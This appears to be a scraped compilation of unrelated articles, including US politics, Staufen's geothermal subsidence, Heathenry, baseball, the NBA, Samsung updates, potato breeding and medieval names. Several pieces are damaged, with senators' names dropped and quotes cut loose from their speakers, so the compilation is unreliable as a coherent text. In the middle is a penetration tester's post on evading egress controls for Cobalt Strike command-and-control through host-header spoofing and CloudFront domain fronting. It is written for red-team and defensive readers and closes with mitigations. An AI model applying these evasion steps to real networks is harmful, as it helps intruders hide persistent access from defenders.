Obama's campaign strategists will also attempt to use the president's strong counterterrorism record – notably the killing of both Osama Bin Laden and al Qaeda cleric Anwar al-Awlaki – to fend off attacks about Obama's lacklustre economic record.
Republicans in the past have effectively depicted Democrats as weak on national security; in 2004, George W. Bush was able to capitalise on post-9/11 anxiety and rival John Kerry's image as not tough enough to handle terrorism threats. But Obama's successes in fighting terrorism have earned praise from both sides of the political divide, and none of the Republican presidential frontrunners have comparable foreign policy experience. “Republicans should just cede that issue now,” Chapin noted.
But if Obama's national security victories rob Republicans of one of their usual arguments against Democratic presidential candidates, analysts agree that the economy will be the focus of the 2012 election. As Ari Berman of The Nation assessed, “Social issues and national security are not at the forefront of Americans' minds right now”.
That explains why Obama called himself "the underdog” during an interview on major TV network ABC this week, before adding: "But at the end of the day, people are going to ask: ‘Who's got a vision?'”
As Dr. Larry Sabato, director of the University of Virginia Center for Politics, put it: “Obama's hope is that Americans will give him credit for trying.” But, Sabato warned, the chances of that are growing slimmer with each day of high unemployment. “Even though he's still doing OK in polling, the bottom-line economic numbers are very poor and do not bode well for him if they do not improve,” he said.
Surely aware of that vulnerability, Obama has been urging voters to be pragmatic. At the fundraiser in California, he fittingly summed up his re-election campaign strategy thus far: “Don't compare me to the almighty, compare me to the alternative.”

iPhone News
We've had the iPhone book ready to go beta for some months, but were prevented from publishing it because of the iPhone SDK's Non-Disclosure Agreement (which affects all publishers regarding this material, regardless of whether the reader is a member of the ADC or not).
Normally, pre-release NDA's such as this one are lifted when the product finally ships. We expected that this NDA would be lifted when the iPhone 2.0 software shipped, but it wasn't. The September announcement came and went, and still the NDA remains in place.
It now appears that Apple does not intend to lift the NDA any time soon. Regrettably, this means we are pulling our iPhone book out of production. But all is not lost: we are actively looking at alternative ways of getting this content to you. It probably won't happen anytime soon, but know that we are doing what we can.

The German town of Staufen is falling apart at the seams. The town of 8,100 residents, located on the edge of the Black Forest, decided to invest in geothermal energy back in 2007, aiming for a green energy future. Unfortunately, the decision backfired when the underground drilling went wrong causing hundreds of buildings to begin cracking apart.
The town rests on a layer of soft anhydrite, below which is a layer of groundwater confined to an aquifer. It was this combination which proved to be fatal for the Baden Württenburg hamlet. When the drills hit the groundwater, it poured into the anhydrate, which soon formed gypsum and expanded by about 50 percent. Over 270 buildings have suffered fractures in the ten years since and things don't appear to be getting any better.

“We've been in crisis mode for ten years,” Mayor Michael Benitz told news agency DPA. “It's a slow-motion catastrophe. In combination with groundwater, this layer of earth turns into cement, expanding the layers and forcing the earth upwards.”
In some places the town of Staufen has risen nearly 62 centimeters and moved sideways by 45 centimeters, causing buildings to pull apart. Two houses have been demolished already, and the town fears that several more buildings will need to be torn down to avoid accidental collapsing. Demolitions are necessary because structures structures are not shifting uniformly, but instead different parts of a building are shifting by slightly different amounts, so repairs are virtually impossible.
The financial fallout for the residents is immense, with over 400 claims filed so far with a mediation body established to manage the crisis.

“Fractures have become our daily companions,” resident Csaba-Peter Gaspar told The Local. His apartment is located in the town's historic core and has suffered significant damage.
Pumps in Staufen are working around the clock to dredge groundwater and minimize imminent damage, but while they have helped reduce the buildup of cement and slow down the rise of the ground to millimeters from the initial phase of several centimeters, it is uncertain how long they will need to be in operation before things go back to normal
“I'm working on the assumption that we'll be grappling with this problem for several more years, probably even decades,” Staufen's mayor said.
﻿
Unfortunately, Staufen is not the only community suffering as a result of the botched geothermal drilling. Geologists from nearby Freiburg have reported similar issues unfolding in the nearby towns of Böblingen and Rudersberg.
Despite this serious catastrophe, the Berlin-based German Geothermal Association insists that the benefits outweighs the risks, and that geothermal energy remains a smart and environmentally sound option. Meanwhile, Staufen is in for decades of devastation and ballooning repair costs.
The Senate left town Thursday without a deal for renewing federal employment benefits after bipartisan talks over an offset reached an acrimonious impasse.

Prospects for forging an agreement that could pass the upper chamber with bipartisan support seesawed throughout the day, with Democratic leaders expressing optimism that a deal was close.But hopes for a breakthrough were dashed when Senate Majority Leader(D-Nev.) offered up a mostly Democratic-driven plan that would cover the $18 billion cost of extending the federal benefits through November.Senate Republicans were further incensed when Reid told them he would not allow any amendments to the plan.“I have been waiting here for more than 24 hours for a reasonable proposal by my Republican friends to pay for this. We don't have one yet," Reid said on the floor.Republicans lashed out at Reid, arguing they had put ideas forward, and all they wanted to do was sit down and work out a bipartisan agreement.In the past 24 hours, Reid shifted his focus to passing a one-year deal, creating some distance between the three-month plan Republican supporters said they wanted.Sen.(R-Ohio) said it is still his aim to produce for a short-term paid-for bill that includes some structural changes to the unemployment insurance program designed to help the long-term unemployed get skills training while they look for a new job.Sen.(R-Ind.), who along with Portman supported the procedural motion to debate the bill this week, said he was disappointed and surprised by Reid's maneuver."We think we have some very constructive proposals that would make the bill better and would achieve bipartisan support," Coats told reporters."But the majority leader today essentially shut down, not just Republicans, but his own party."At this point, Coats said he would not be willing to end debate on the unemployment bill unless there are some changes between now and next week.Coats said the upper chamber could have been done with the bill on Thursday if amendments had been allowed."We weren't trying to delay this bill," he said."We just sat here for 36 hours or more waiting for Harry Reid to decide what to do and then he comes down and says we're delaying, we're obstructionists."He was the obstructionist in this case."Reid's $18 billion proposal would take a portion of Portman's idea to end duplicate payments for disability, unemployment insurance and trade adjustment assistance for savings of $1 billion.Reid also would slightly cut the number of weeks offered to the long-term unemployed and would add another year of sequestration.He said bill co-sponsor Sen. Jack Reed (D-R.I.) "had done a yeoman's job," but it was time to move on to other issues."The time is now to fish or cut bait," he said.Reed, fellow co-sponsor Sen. Dean Heller (R-Nev.) and Senate Budget Committee Chairwoman Patty Murray (D-Wash.) hammered out the proposal."This takes care of it for the good part of this year," Reid said.Reid argued he was offering up a "pretty good deal" to Republicans, and he was "pretty disappointed that nothing is quite good enough" for his GOP colleagues.He suggested the Republicans wanted to offer a slew of amendments to "do nothing but whack ObamaCare."Sen. Bob Corker (R-Tenn.) suggested the proposal was all a part of a Democratic plan to take to the Sunday news shows and complain about how Republicans are refusing to pass a bill to help the 1.3 million who lost their benefits at the end of the year.Passage of an 11-month measure would mean Congress would likely be faced with another renewal right after the midterm elections.Coats and Portman said they were both looking more closely at the plan Reid offered but figured there is no way Republicans would accept extending the sequester cuts into 2024.Still, Republicans and Democrats emerged from evening votes sounding hopeful that they could work out a deal to renew federal unemployment benefits."Maybe, let's hope they [talks] can be put back together over the weekend," Sen. Charles Schumer (D-N.Y.) told reporters Thursday night."I don't think it's irreparable," he said.Coats and Portman each said they held conversations with their colleagues during votes to discuss a way forward."I hope we're still able to work out something," Portman said."The bill is not DOA yet."

Introduction Heathenry Heathenry is a term used to describe the religious practices of two main groups of people, one historical and one modern. The original Heathens were the pre-Christian North European peoples who lived a thousand and more years ago in the lands around what is now called the North Sea. These included the peoples of Anglo-Saxon England, Scandinavia, Germany and Frisia (Friesland). Modern Heathen groups around the world are reviving these old practices and call their religion by various names including Asatru, The Northern Tradition, Odinism, Forn Sed, Germanic Pagan Reconstructionism or, simply, Heathenry. In Iceland, which did not convert to Christianity until the 11th Century, Heathenry has once again become an official (nationally recognised) religion. Heathens work to build healthy relationships with gods and goddesses, ancestors, spirits of the land, and others in their communities, both through holy rites and through their day-to-day actions. Sources There are literary sources that tell us how Heathenry was practised before the advent of Christianity. The main such sources include medieval Icelandic Eddas and Sagas, Anglo-Saxon poetry, the works of the 8th century English monk Saint Bede, and the Germania by the Roman historian Tacitus. Although most of these were written in Christian times, they record the religious beliefs and practices of a culture that existed before Christianity came to Northern Europe. Archaeological evidence continues to be discovered which supports this picture of Heathen religion obtained from such classical and medieval literature. Alongside these historical sources, modern Heathens experience their own, personal, understanding of their religion as lived today, and their own relationship with their gods. Gods and other beings Heathenry, like all ancient European pagan religions, is polytheistic and recognises a large number of gods and other spiritual entities. Although the Heathen gods are best known from Norse Mythology (and often called by Anglicised versions of their Old Norse names) they were honoured by many peoples outside of Scandinavia. For example, the god known to early Germanic tribes as Wodhanaz became Odhinn in Old Norse, Woden in Anglo-Saxon and Old Saxon, and Wuotan in Old High German. Some of the most well known Heathen gods are enshrined in our English days of the week. Tuesday is named after Tiw (Tyr), Wednesday after Woden (Odin), Thursday after Thunor (Thor) and Friday after the goddess Frige (Frigg). In addition to the better known 'major gods', the names of several dozen local or tribal gods are known through medieval literature, runic inscriptions, and votive stones. Most Heathens choose to actively honour a subset of gods with whom they have developed personal relationships, although offerings are also often made 'to all the gods and goddesses'. Heathens relate to their gods as complex personalities who each have many different attributes and talents. For example, whereas Thor is popularly known outside Heathen circles as the mighty hammer-wielding God of Thunder, in Eddic poetry he is called by names such as Deep Thinker, Man's Well-Wisher, and Consecrator Thor, revealing a gentler side to his nature. In addition to gods, Heathens recognise and relate to a wide variety of spiritual beings or 'wights'. These include the Norns - who are three female entities who weave the web of wyrd - and the Disir - who are female ancestral spirits attached to a tribe, family, or individual. Heathens also work with 'hidden folk' such as elves, brownies, dwarves and etins (giants and other not so pleasant folk). They interact with the housewights who live in their homes and the landwights who occupy features of the landscape such as streams, mountains, forests or fields. Having a relationship with landwights is an important feature of Heathen religion and outdoor Heathen rituals will not proceed until the permission of landwights is sought and obtained. Another characteristic of Heathen religion is the respect given to ancestors in general. These may be a person's literal forebears, or may be people now dead who have inspired them in some way. The Norse gods in history Carolyne Larrington, Tutor in Medieval English at St John's College, Oxford; Heather O'Donoghue, Vigfusson Rausing, Reader in Ancient Icelandic Literature in the Department of English at Oxford University and John Hines, Professor of Archaeology at Cardiff University discuss the role of theology and the gods in the Vikings' daily lives. Structure There are no central authorities in Heathenry and no single organisation to which all Heathens belong, though there are national and international organisations created to facilitate networking between Heathens. There is no widely recognised priesthood, although sometimes individuals may be recognised as godhis and gydhjas (priests and priestesses) within their own communities. Many Heathens belong to small groups made up of Heathen friends and family members. These groups are sometimes called 'hearths' or 'kindreds' and meet for religious rituals in members' homes or in outdoor spaces. Some hearths and kindreds have recognised leaders. Others are entirely egalitarian. Top
Rites, festivals and practices Rites and celebrations The main rites celebrated in Heathenry are called blot (pronounced 'bloat') and symbel (pronounced 'sumble'). Heathen groups and individuals hold feasts and celebrations based around blot and symbel at rites of passage (such as weddings or baby-namings), seasonal holidays, oath-takings, rites in honour of a particular god or gods, and rites of need (in which gods are asked for help). A blot was originally the ritual sacrifice of an animal to one or more gods, elves or ancestors. A feast followed afterwards at which the meat was shared amongst the participants. Blots were held to honour the gods or to gain their favour for specific purposes such as peace, victory, or good sailing weather. A modern blot centres around the offering of food or drink (often mead) to the gods and tends to be followed by a feast. It may be a simple rite or a more elaborate one depending on the purpose of the blot and the number of participants. In an indoor blot where food is offered, it is common to lay a place for the god, ancestor or elf at the table. In an outdoor blot offerings are often thrown onto a fire. Symbel is a ritual drinking ceremony in which one or more drinking horns or other vessels are filled with mead (or another appropriate drink) and used for toasting or boasting. It is common for modern Heathens to pass the horn(s) around all those participating after liquid is blessed. The first round of toasts may be to the gods, the second round to wights or ancestors, and the third round may be to whatever else the assembled Heathens wish to toast. There may be many more rounds, or the symbel may stop after a designated number. A separate libation (drink offering) may be given to the gods, landwights or housewights, or some of the contents of the horn may be poured out as an offering to them. As well as major offerings to the gods or elves, Heathens like to leave gifts for their domestic hidden folk: the wights who live in their garden and house. For this purpose, many Heathens keep a special bowl to leave offerings in the house of cakes and ale, or may leave food or drink on or near a small garden altar. Festivals Different Heathen communities and individuals celebrate different cycles of seasonal holidays based on their cultural affiliations, local traditions, and relationships with particular gods. There is no fixed calendar of Heathen festival dates. The three Heathen festivals most commonly celebrated in the UK are Winter Nights - usually celebrated in October or November, Yule - a twelve day festival that begins around the time of the winter solstice, and a festival for the Anglo-Saxon goddess Eostre in the spring. Magic and seership Magic and seership were practised by some individuals within ancient Heathen cultures, and this is also the case with today's Heathen community. Some Northern European magical practices being revived by Heathens include the carving of runes onto talismans and the chanting of charms called galdor. Some Heathens are also rediscovering Northern European shamanistic practices known as seidh (pronounced 'sayth'). In a ritual called 'oracular seidh' a seer or seeress answers questions or gives advice to participants. Many modern Heathens also practice runic divination. Although magic was part of ancient Heathen culture, it did not play a part in the religious rituals of blot and symbel. Therefore, it is not seen as an intrinsic part of the religion. Although all Heathens share a belief in the ability of the gods to enact change in the world, they do not all believe in the ability of magicians to do so. Top
A command kill chain consists of payload delivery, code execution on a target system, and establishing a command and control (C2) channel outside of a network. There are many ways to achieve each of these steps; for example, Microsoft Office Macro for delivery, PowerShell for code execution and HTTP as transport for C2.
We and our fellow attack and penetration teammates are constantly looking for new tactics, techniques and procedures (TTP) to bypass network-based and host-based deterrents that can introduce block points within the kill chain. In this post, we'll specifically be speaking to solutions and controls such as firewalls, IDP, IPS, and proxies that aim to prevent C2. The post will conclude with TTPs that we have used with various levels of success.
Before we jump in, a little bit of a high-level background regarding how most of these solutions work and some of their features. Forgive our brevity here - going over each feature could be a book. If you are familiar with these controls and just want to get to the relevant sections, feel free to jump ahead.
Firewalls can be used to restrict outbound network traffic. For example, the traffic may consist of only allowing TCP 80 and 443 out of a network through a proxy. Further, many devices can inspect this traffic at the application layer.
Inline proxies can inspect traffic including encrypted transports such as TLS/SSL by essentially intercepting all traffic.
Proxies can categorize and allow outbound URLs based on defined rules. For example, rules may be defined as blocking access to Dropbox and categorizing it as a file sharing service.
Additional inline protections can inspect traffic for malicious payloads, some can even execute those payloads in a sandbox environment and identify malicious execution and known indicators of compromise (IOC).
Bypassing these solutions and others has always been a reciprocal arms race between aggressor and defender. In the current landscape, when we're planning attacks, we assume that TCP 80 and 443 are allowed outbound through an inspecting proxy that will be using a whitelist approach of categorized URLs, and will be inspecting the application layer for correctness. Meaning, we cannot configure our payloads to simply connect over a raw TCP connection over some arbitrary port to some arbitrary IP. Thus, our payloads must:
Connect over TCP 80 and/or 443 using HTTP(s)
Connect to a categorized URL
Bypass inspection
You may have said to yourself, “They forgot about ICMP and DNS!” Yes, you are right! We have seen great success using DNS tunneling, and would say it's 50/50 as to whether ICMP is blocked. In fact, in our opinion the best approach is to configure payloads to attempt to establish connections over DNS and HTTP, thus giving you the greatest chance for success. Using DNS as a main channel and then establishing additional channels using HTTP is a great approach as well. We've also used other protocols and applications, such as SIP and Exchange, but we'll save that for another post.
Getting a site categorized isn't too difficult, it just takes time; and it's a little “sketchy.” Albeit, taking the time to register a false business such as a healthcare provider, setting up the site, and waiting indefinitely for multiple vendors to categorize it is not always ideal. Additionally, there is the problem of dealing with the many vendors, and you can never be too sure your site will be categorized correctly, and then you can't know for sure if that category will be allowed. There have been some posts written on that, so we won't go into further detail here.
Next up is the task of bypassing any inspection. We use Cobalt Strike, which supports a featured called “Malleable C2.” This permits us to customize how the traffic of our payload will appear on the network. Making it very difficult to detect. For example, we can make our traffic look like Microsoft Updates or banking traffic from a popular site.
Vendor mitigation solutions used to grab payloads during delivery, and then execute them in a sandbox while identifying indicators of compromise have had some success against Cobalt Strike, but we have had success against these mitigation tactics using keyed payloads (check out Ebowla), and a little sum-sum we'll be releasing at DefCon.
THE GOOD STUFF
Enough with the background, on to the cool stuff! Here are several methods that can be used to bypass not only URL categorization, but often inspection. This is not a comprehensive list, and none of these methods are “new”; there are no 0-dayz here.
The bonus to each of these bypasses is that most vendor mitigation tactics by default will not perform any inspection at all.
HOST HEADER SPOOFING
We identified this several years ago, and didn't think much of it. We thought for sure that vendors were aware of this issue. Turns out, they were not, and within the past couple of years several researchers have disclosed the method and it has, for the most part, been fixed, or workarounds have been developed. The CVE's are light on the details, but the problem is easy to understand.
These vendor mitigation tactics inspect the HTTP host header to categorize a site, which can easily be set by an attacker. For example, there is nothing preventing us from establishing a TCP connection by one hostname or IP address and then specifying the host header as “www.microsoft.com.” Thus, anything inline keying off this header should allow our payload through because it matches an allowed site.
One way this problem has been solved is by allowing the inline solution to perform DNS on behalf of the requester. This way they can ensure the IP to which the host header resolves matches the requested destination IP. Okay, can't depend on this one as bulletproof, but this still works occasionally.
OVERLY PERMISSIVE RULES
We actually didn't know how to title this one, because it's not fair to say the rules are entirely overly permissive. But there are a few tricks that can be used to bypass some rules. For example, *.amazonaws.com is often allowed. If you have ever used EC2 you may have noticed your system is given a hostname that can be used as a URL, such as ec2-10-1-1-1.compute-1.amazonaws.com. By using EC2 you now have a categorized site.
S3 can also be used as a channel (with some work) and is a great delivery method as it is categorized and often allowed.
DOMAIN FRONTING
Finally, the reason we started writing this post. This is a method we became aware of just recently after reading a post from Signal regarding bypassing restrictions in Egypt. They are using a method called “domain fronting” to ensure users have connectivity. From the post:
“Many popular services and CDNs, such as Google, Amazon Cloudfront, Amazon S3, Azure, CloudFlare, Fastly, and Akamai can be used to access Signal in ways that look indistinguishable from other uncensored traffic. The idea is that to block the target traffic, the censor would also have to block those entire services. With enough large scale services acting as domain fronts, disabling Signal starts to look like disabling the internet.”
There is additional research linked in the post here. The TL;DR is that we can use many of these services as a reverse proxy for HTTP, and since they are trusted resources, they will bypass filtering rules.
We dug into one of these services, Amazon CloudFront, and developed a proof-of-concept for the team as soon as we read this, and present it here for you the reader.
Step 0: Punch a hole in our NAT for demo purposes
In this example we were using Ngrok to punch a hole in our NAT and to hide our IP address from you pesky readers. If you're going to do this IRL replace any instance of 0.tcp.ngrok.io with your own hostname or IP address. If you haven't heard of Ngrok, check it out!
Pro Tip: Use a hostname for C2 channels, if an IP address gets blocked, you can easily move your infrastructure.
This creates a listener at 0.tcp.ngrok.io on port 14380 and will forward all traffic to our localhost on port 80.
Step 1: Setup CloudFront
The process of setting up CloudFront is not too difficult, but we'll save you some time by giving you the configuration details needed to make a C2 payload work. Please feel free to buy us a Coke next time you see us. We're going to assume you have setup an AWS account. You will end up with a “CloudFront Distribution” that looks like this on your dashboard.
In the above picture, you can see a domain name has been provided “d6xxxxf1ac.cloudfront.net”. We will use this in our payload for the destination address.
To get there you'll need to modify the origin and behaviors, here's what we used.
The “edit behavior” menu is the most important part of this equation. We need to ensure that CloudFront never caches the request/response and will always forward. Additionally, we need to ensure that the request and response are not modified, or else our Malleable C2 profile may not work.
Step 2: Cobalt Strike
We need to configure Cobalt Strike to work with CloudFront, which is easy. First, the listener needs to be configured for the CloudFront domain provided. Then we need to build a Malleable C2 profile that will set the host header to the CloudFront domain. Finally, we'll setup scripted web delivery for our demo.
Step 3: Delivery and Execution
We used PowerShell on a lab system for demonstration purposes.
Here is a portion of the packet capture showing the stager loading over the wire.
The Cobalt Strike stager does not currently use the Malleable C2 profile. So, you will need to have your beacon listener set accordingly in the console, that way the host header in the initial HTTP requests will be set correctly.
There you have it. There is another aspect on domain fronting that is discussed within the aforementioned post and research - you can establish the TCP connection using the hostname of a different domain than the one you are using, and then use the host header for routing. We did not attempt this approach, but it is something worth investigating for sure.
So, how do you prevent this? We haven't come up with the almighty panacea, however; there are a few things you can do.
Configure your systems to perform active inspection of all traffic, even if the URL is allowed.
Enforce stricter rules, for example, don't allow *.amazonaws.com, or *.google.com. Note, this is going to be tedious and may block legitimate traffic.
Monitor and alert on excessive requests to any site, especially outside of normal operating hours.
Any others? Please provide suggestions in the comments. We would love to hear them. Additionally, if you would like to talk more about how you can prevent this step in the attack chain as well as others, please reach out to us. We can work with you to ensure your network is resilient to attacks, such as this.
Former Athletics starter Dallas Braden has decided to retire, reports Susan Slusser of the San Francisco Chronicle. Braden has not thrown a professional pitch since 2011, but had intended to put on a showcase for teams this winter in hopes of getting a chance to work back.
Now 30, the southpaw had a stellar campaign for the A's back in 2010 as a 26-year-old. He put up a 3.50 ERA in 192 2/3 innings, capping things off by throwing a memorable perfect game. Braden was off to a nice start early in the 2011 campaign when he succumbed to a series of shoulder and rotator cuff issues. The's allowed Braden to become a free agent before last season rather than tendering him arbitration.
Slusser reports that Braden's comeback plans were shelved when a recent MRI revealed that the damage was beyond fixing. “There is nothing left in there, it's just a shredded mess,” Braden told Slusser. “I left my arm on the mound at the Coliseum, and I'm okay with that."
Don Baylor, the 1979 American League MVP, died Monday of cancer. He was 68.
"Don passed from this earth with the same fierce dignity with which he played the game and lived his life," his wife, Rebecca, said in a statement.
Editor's Picks Don Baylor: The toughest -- and gentlest -- of baseball's giants He was one of the more intimidating players in the game's history, but "Groove" was a tender teacher and teammate to those who played alongside him and to those who covered him.
He died Monday at a hospital in Austin, Texas, his son, Don Baylor Jr., told the Austin American-Statesman.
Baylor played for the Orioles, Athletics, Angels, Yankees, Red Sox and Twins over a 19-year career. He was an All-Star and the MVP winner with the Angels in 1979, when he led the majors in RBIs and runs and also set career highs in home runs and hits.
He reached the World Series three straight times at the end of his career from 1986 to 1988 and won the title with the Twins in 1987.
Baylor batted .260 with 338 home runs and 1,276 RBIs in his career. He led the majors seven times in being hit by pitches during a season, including taking 35 of them in 1986 with the Red Sox. He drew 267 HBPs in his career.
He was also known for speed as a younger player, including a career-high 52 steals with Oakland in 1976, and was a bruising baserunner who loved to break up double plays. He finished with 285 steals.
Major League Baseball Players Association executive director Tony Clark issued a statement Monday on the deaths of Baylor and Darren Daulton, the former Philadelphia Phillies All-Star who died Sunday at the age of 55.
"Words cannot express the sadness we feel today, as cancer claims two more of the baseball-playing fraternity's proudest and strongest members," Clark said. "Darren Daulton and Don Baylor will be deeply missed by the entire baseball community. During their playing careers and beyond, both Darren and Don selflessly helped generations of young players transition from wide-eyed rookies into successful Major Leaguers. Don's commitment to the game and its future also inspired him to play an instrumental role in helping the MLBPA establish itself as a bona-fide union.
"Our thoughts and prayers are with Darren's and Don's families, friends and legions of fans."
MLB commissioner Rob Manfred also expressed his condolences to the families of Baylor and Daulton in a statement.
"Throughout stints with 14 different major league teams as a player, coach or manager, Don's reputation as a gentleman always preceded him," Manfred said.

After his playing career, Baylor served as the manager of the Colorado Rockies for their inaugural season in 1993. He was the team's skipper for six seasons and took the Rockies to their first postseason appearance in 1995, when he also was named National League Manager of the Year. Baylor is one of four men, along with Frank Robinson, Joe Torre and Kirk Gibson, to win both an MVP and Manager of the Year award, according to ESPN Stats & Information research.
Baylor also managed the Chicago Cubs from 2000 to 2002. He had a career record of 627-689 as a manager.
He was diagnosed with multiple myeloma 14 years ago, according to his family. He partnered with former Yankees pitcher Mel Stottlemyre to increase awareness and promote research of the disease.
Born June 28, 1949, in Austin, Baylor was a second-round pick by Baltimore in 1967 and chose baseball over a chance to be the first black football player at Texas. Two years later, the Longhorns became the last all-white team to win a national championship.
Mostly a designated hitter but also an outfielder and first baseman, Baylor went to junior college before joining the Orioles organization. He made his big league debut in 1970 and spent six years with Baltimore. After a year in the first of two stints with Oakland, Baylor played six seasons for the Angels.
The Orioles and Angels opened a three-game series against each other on Monday night in Anaheim with a moment of silence for Baylor.
Baylor is survived by his wife, son and two granddaughters.

Samsung has just released the latest update of the Android 6.0.1 Marshmallow operating system, but it seems that it may have a few bugs that need some working on.
Some Galaxy Note 5, Galaxy S6 and Galaxy S7 owners have turned to various Samsung community forums to complain about a number of issues with the Android OS update.
When the latest version of the Marshmallow OS was first rolled out last month, some Galaxy users claimed that their devices started to drain battery charges faster after they installed the update. Others also encountered issues with their Gear VR headsets that fail to establish connection with their Samsung smartphones.
One user going by the handle KruseLudsMobile posted on XDA-Developers's Android forum complaining that after upgrading to the latest Marshmallow OS version, his Samsung device started to use up its battery at a much faster rate than before. He said he is using an unrooted OEM device.
Another forum member, ptko15, said he has been unable to download or update Amazon apps on his Galaxy Note 5 after getting the update. His device also started to experience lag problems with the new Marshmallow update installed.
Problems with the Android OS update seem to apply with Galaxy Note 5 handsets carried by Verizon, which gave the Marshmallow rollout ahead of AT&T and T-Mobile. Several subscribers have flocked the telecom company's community page to ask help with their devices.
A Verizon subscriber wrote about an issue with Wi-Fi connectivity after installing the Marshmallow update on his Samsung device.
"Upon completing the OTA update to Android Marshmallow last evening, my Wi-Fi connection is not stable," user jpheim589 pointed out. "It connects to the network, but anytime I go to a Web page I get DNS probe and connection errors. Anytime I switch back to 4G the issues go away until back on Wi-Fi."
While jpheim589 later claimed that he was able to find a fix after resetting the network setting on his device, his troubleshooting tip doesn't seem to work on other gadgets, just like what another user, Dano1321, experienced.
Another user on the Verizon community page shared that his Galaxy Note 5 keeps dropping the Wi-Fi connection after 20 seconds every time he tries to download from the Google app store. His device also drains its battery much faster after installing the Marshmallow update.
Samsung has received news about these issues and is now planning to release a second version of the Android 6.0.1 update to fix problems with Galaxy devices. Meanwhile, here are some possible quick fixes for Lollipop problems and Marshmallow problems that are also troubling the Galaxy smartphones mentioned above.

Andre Iguodala takes off in transition and gets rejected by LeBron James in the final minutes. (0:35)
OAKLAND, Calif. -- It was a championship 52 years in the making.
With 333 of the 336 regulation minutes through seven games of the NBA Finals in the books, the Cleveland Cavaliers and Golden State Warriors were tied 699-699.
Then LeBron James kept the Cavs alive with a late, chase-down block, Kyrie Irving put them ahead for good with a 3-pointer with 53 seconds left, and the Cavaliers vanquished the championship curse of Cleveland once and for all.
James, with 27 points, 11 rebounds, 11 assists and three blocked shots while playing 47 of 48 minutes, led the way. Irving -- 26 points and six assists -- followed in tandem.
The Cavs, at long last, were on top of the basketball world with their first NBA title. It was won by the Cavs, but it is made all the more meaningful by decades of losing seasons from Cleveland's Browns and Indians, as well.
"I don't know why the man above give me the hardest road, but ... the man above don't put you in situations that you can't handle," James said after the final buzzer on Sunday. "I just kept that same positive attitude. Instead of saying, 'Why me?' I said, 'This is what He wants me to do.' And Cleveland, this is for you."
It took a native son -- the most important draft pick in franchise history 13 oh-so-lucky years ago, who was born and bred about 30 miles down the road in Akron, Ohio -- to break the cycle of disappointment.
If back-to-back titles in Miami were James' breakthrough as one of the game's all-time greats, the championship in Cleveland represents his ascension to living-legend status. Forget The Shot, The Drive, The Fumble. The Land now has The Comeback, thanks to The King.

His NBA Finals record still stands at a lopsided 3-4. It isn't nearly as stellar a bullet point on his résumé as his four MVP awards and his top-five ranking in all-time playoff points, assists and steals, but James' third ring carries so much weight.
Hundreds of players have won the NBA title, but nobody has done it quite like James and the Cavs did this year. James dominated the series and pushed it to an improbable brink with back-to-back 41-point games to bring Cleveland back from a 3-1 deficit. The first 32 teams to fall down 3-1 in the Finals ended up losers. The Cavs, led by a certain No. 23, made sure that streak ended.
A win by the Warriors would have solidified their place in the discussion of the greatest team ever. James' performance in the series changed the conversation and steered it toward consideration of him as the greatest player ever.
He did it, of course, on the same court as the league's back-to-back MVP, Stephen Curry. Anyone watching could see by James' play that when it matters most, James remains the best the sport has to offer, with Curry a level below. And he won the championship by elevating a group of teammates -- Kyrie Irving, Kevin Love and Tristan Thompson, with a combined zero playoff games among them before James came back to Cleveland -- to the game's zenith.
Editor's Picks Season full of history ends in misery for Golden State After a season that saw an NBA-record 73 wins, another MVP for Steph Curry and endless accolades, the Warriors failed when it counted the most. What's the next step after their shocking collapse?

As he posted in his homecoming letter in Sports Illustrated, "In Northeast Ohio, nothing is given. Everything is earned. You work for what you have."
James and the Cavaliers outworked and outlasted the greatest regular-season team.
Now, at last, the city of Cleveland can rejoice in a well-earned championship, one that will be remembered for the ages.
“That's a way they continue to evolve as the climate changes or as disease and pest patterns change.”
“But (in the United States), we have removed our potatoes from that environment. We have to breed new genes in from these wild relatives when we want to improve our cultivars.”
“If you go down there [South America, PP] and drive along the roadside you can see these weedy, wild plants growing along the roads and fields.”
“Whenever we have looked for any trait in wild potato species, we have been able to find it.”
Shelley Jansky's team improved potato qualities by cross-breeding with South American wild potatoes. (Courtesy: Shelley Jansky)
“Finding this marker will allow us—and other breeding programs—to make faster progress in breeding potato plants with high tuber calcium content.”
“This has been difficult and time-consuming in the past. You have to grow all the populations, harvest tubers, and then analyze the tubers for the trait you are looking at -- in this case tuber calcium levels. And that's a long, laborious process.”
“We can collect DNA from seedlings and check for these molecular markers”
“If you have the marker present, then you select those seedlings and save a tremendous amount of time and labor.”
Have you ever cut into a potato to find a dark spot or hollow part? Early research shows that these defects are likely the result of calcium deficiencies in the potato -- and that tuber calcium is genetically linked to tuber quality.Neither consumers at grocery store nor the companies that make potato chips and fries want these low calcium defects. In addition to the cosmetic issues, these potatoes are more likely to rot.Most farmed varieties of potatoes have naturally low levels of calcium. So researchers at the USDA-ARS and University of Wisconsin-Madison, including Shelley Jansky, John Bamberg, and Jiwan Palta looked to wild potatoes. Their purpose: to breed new potato cultivars with high calcium levels.Many wild potato relatives are still present in South America. Their presence means growers' potato plants in that region often exchange genes with wild species.Shelley Jansky, Research Geneticist at the USDA-Agricultural Research Service Vegetable Crops Research Unit and an Associate Professor in the Department of Horticulture at the University of Wisconsin-Madison:These wild relatives are an invaluable resource for scientists across the country.Jansky:And so it was with searching for a high calcium potato. The team found a wild potato with almost seven times as much calcium as a usual variety.The next job was to isolate the calcium trait. Jansky and her colleagues interbred the high- and low-calcium potatoes. The resulting generations showed a ‘molecular marker'—a pattern in the plant's natural DNA. This pattern led researchers to the plant's calcium trait.Jansky:A typical breeding program grows and assesses up to 100,000 seedlings every year. It takes between 10-15 years to release a particular variety of crop plant.However, the process simplifies with known molecular markers.Yong Suk Chung, the first author of this study:The research is published in Crop Science: Yong Suk Chunga, Jiwan Paltaa, John Bamberg and Shelley Jansky Potential Molecular Markers Associated with Tuber Calcium Content in Wild Potato Germplasm
Looking for that great ‘medieval' name for your newborn daughter? Here are ten names from medieval London that you may never have heard of!
A recent survey from England tells us that parents are more interested in finding names for their children that have some history to it – and that names like Millicent, Elvina and Kendra are increasingly popular for girls. However, if you really want to get medieval, and don't want to use the old standards like Alice, Margaret or Johanna, we've got ten names for you. Each one can be found in the records of 13th and 14th century London, and we've added little information about who they were – which ones were inheriting wealth, and which of them was serving time in prison – Enjoy!
Scolastica – She was the prioress of of St. Helen's Bishopsgate from 1261 to 1269.
Petronilla – In 1305, Petronilla, widow of Walter Wolleword, was accused by one of his family members of taking away from the house she rented a bed, three lead cisterns and utensils. She gave proof that the items were hers and was acquitted.
